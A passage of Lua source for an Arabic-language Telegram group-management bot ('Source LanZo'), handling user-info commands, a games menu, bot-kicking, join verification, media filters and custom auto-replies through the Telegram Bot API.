if text == "↫ بوت الكت ᥀" and ChCheck(msg) or text == "بوت الكت" and ChCheck(msg) or text == "بوت كت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/E9OBot"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت الكت*',nil,inline) return false end
if text == "↫ بوت الزخرفه ᥀" and ChCheck(msg) or text == "بوت الزخرفه" and ChCheck(msg) or text == "بوت زخرفه" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/W5555Bot"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت الزخرفه*',nil,inline) return false end
if text == "ايديي" and ChCheck(msg) or text == "↫ ايديي ᥀" and ChCheck(msg) then Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
-- Source LanZo --
if text == 'نبذا' and ChCheck(msg) or text == '↫ نبذا ᥀' then
local LanZoTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_aMeR(msg.chat_id_, msg.id_, 1, ''..LanZoTeam[math.random(#LanZoTeam)]..'' , 1, 'md')  
return false
end
--     Source LanZo     --
if text and (text == 'المطور' or text == 'مطور' or text == '↫  المطور ᥀') then
tdcli_function({ID="GetUser",user_id_=LANZO},function(arg,result)
local msg_id = msg.id_/2097152/0.5
Text = "*᥀︙Dev Name ↬ * ["..result.first_name_.."](T.me/"..result.username_..")\n*᥀︙Dev User ↬* [@"..result.username_.."]"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or Bw5Bw}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
--     Source LanZo     --
if text == "معرفي" or text == "↫  معرفي ᥀" then
function get_username(extra,result,success)
text = '᥀︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" or text == "↫  اسمي ᥀" then
function get_firstname(extra,result,success)
text = '᥀︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end 
if text == 'نبذتي' or text == 'بايو' or text == '↫  نبذتي ᥀' then
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "صورتي" or text == "↫ صورتي ᥀" then
local my_ph = DevaMeR:get(LanZo.."aMeR:Photo:Profile"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ᥀︙الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ᥀︙عدد صورك ↫ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
--     Source LanZo     --
if text == "الالعاب المتطوره" or text == "الالعاب الاحترافيه" or text == "↫ الالعاب المتطوره ᥀" then
if not DevaMeR:get(LanZo..'aMeR:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*᥀︙قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="♟ الشطرنج ♟",url='https://t.me/T4TTTTBOT?game=chess'}},
{{text="لعبة فلابي بيرد 🐥",url='https://t.me/awesomebot?game=FlappyBird'},{text="تحدي الرياضيات",url='https://t.me/gamebot?game=MathBattle'}},
{{text="اكس او",url='t.me/xobot?start'},{text="سباق الدراجات 🏍",url='https://t.me/gamee?game=MotoFX'}},
{{text="سباق سيارات 🏎",url='https://t.me/gamee?game=F1Racer'},{text="متشابه 👾",url='https://t.me/gamee?game=DiamondRows'}},
{{text="كرة قدم ⚽",url='https://t.me/gamee?game=FootballStar'}},
{{text="ورق🤹‍♂",url='https://t.me/gamee?game=Hexonix'},{text="Hexonix❌",url='https://t.me/gamee?game=Hexonix'}},
{{text="MotoFx🏍️",url='https://t.me/gamee?game=MotoFx'}},
{{text="لعبة 2048 🎰",url='https://t.me/awesomebot?game=g2048'},{text="Squares🏁",url='https://t.me/gamee?game=Squares'}},
{{text="Atomic 1▶️",url='https://t.me/gamee?game=AtomicDrop1'},{text="Corsairs",url='https://t.me/gamebot?game=Corsairs'}},
{{text="LumberJack",url='https://t.me/gamebot?game=LumberJack'}},
{{text="LittlePlane",url='https://t.me/gamee?game=LittlePlane'},{text="RollerDisco",url='https://t.me/gamee?game=RollerDisco'}},
{{text="🦖 لعبة التنين 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 لعبة الافعى 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
{{text="🔵 لعبة الالوان 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
{{text="🚀 لعبة الصاروخ 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 لعبة السهام 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
{{text="لعبة النينجا",url='https://t.me/gamee?game=GravityNinja21'},{text="لعبة الكرتي",url='https://t.me/gamee?game=KarateKid2'}},
{{text = '᥀ LanZo Team .', url="t.me/Bw5Bw"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     Source LanZo     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevaMeR:incr(LanZo..'aMeR:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevaMeR:set(LanZo.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevaMeR:get(LanZo.."aMeR:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(LanZo) then 
DevaMeR:srem(LanZo.."aMeR:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) and not Bot(msg) then
SendText(LANZO,"᥀︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevaMeR:get(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevaMeR:incr(LanZo..'aMeR:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevaMeR:incr(LanZo..'aMeR:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source LanZo     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:FreeBot'..LanZo) then
if ChatType == 'pv' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,aMeR) 
local admins = aMeR.members_
for i=0 , #admins do
if aMeR.members_[i].bot_info_ == false and aMeR.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if aMeR.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevaMeR:sadd(LanZo.."aMeR:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevaMeR:sadd(LanZo.."aMeR:aMeRConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevaMeR:srem(LanZo.."aMeR:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevaMeR:srem(LanZo.."aMeR:aMeRConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevaMeR:sismember(LanZo..'aMeR:Groups',msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevaMeR:get(LanZo..'aMeR:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevaMeR:get(LanZo..'aMeR:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevaMeR:sadd(LanZo.."aMeR:Groups",msg.chat_id_)
DevaMeR:sadd(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevaMeR:set(LanZo.."aMeR:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(LANZO,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙موقعه في المجموعه ↫ "..status.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source LanZo     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevaMeR:set(LanZo..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source LanZo     --
local ReFalse = tostring(msg.chat_id_)
if not DevaMeR:sismember(LanZo.."aMeR:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
--     Source LanZo     --
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevaMeR:get(LanZo..'aMeR:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevaMeR:sadd(LanZo..'aMeR:Tkeed:'..msg.chat_id_, dp.id_)
local Text = '᥀︙اهلا عزيزي ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n᥀︙يجب علينا التأكد أنك لست روبوت\n᥀︙تم تقيدك اضغط الزر بالاسفل لفكه'
keyboard = {} 
keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevaMeR:get(LanZo.."aMeR:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Bot(msg) then 
local filter = DevaMeR:smembers(LanZo.."aMeR:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙الصوره التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Bot(msg) then 
local filter = DevaMeR:smembers(LanZo.."aMeR:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙المتحركه التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Bot(msg) then 
local filter = DevaMeR:smembers(LanZo.."aMeR:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙الملصق الذي ارسلته تم منعه من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source LanZo     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevaMeR:get(LanZo..'aMeR:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:srem(LanZo..'aMeR:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevaMeR:srem(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevaMeR:get(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevaMeR:del(LanZo..'aMeR:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevaMeR:srem(LanZo..'aMeR:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevaMeR:get(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevaMeR:del(LanZo.."aMeR:Add:AllRed"..msg.sender_user_id_)
DevaMeR:del(LanZo.."aMeR:Gif:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:Voice:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:Audio:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:Photo:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:Stecker:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:Video:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:File:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:Text:AllRed"..msg.content_.text_)
DevaMeR:del(LanZo.."aMeR:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source LanZo     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevaMeR:get(LanZo..'aMeR:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevaMeR:smembers(LanZo..'aMeR:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevaMeR:srem(LanZo..'aMeR:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevaMeR:sadd(LanZo..'aMeR:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ ↫ 5 من الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
local aMeR = "᥀︙تم حفظ الرد رقم ↫ "..(#List+1).."\n᥀︙قم بارسال الرد رقم ↫ "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="انهاء وحفظ "..(#List+1).." من الردود",callback_data="/EndRedod:"..msg.sender_user_id_..GetGpTexts}},{{text="الغاء وحذف التخزين",callback_data="/DelRedod:"..msg.sender_user_id_..GetGpTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(aMeR).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
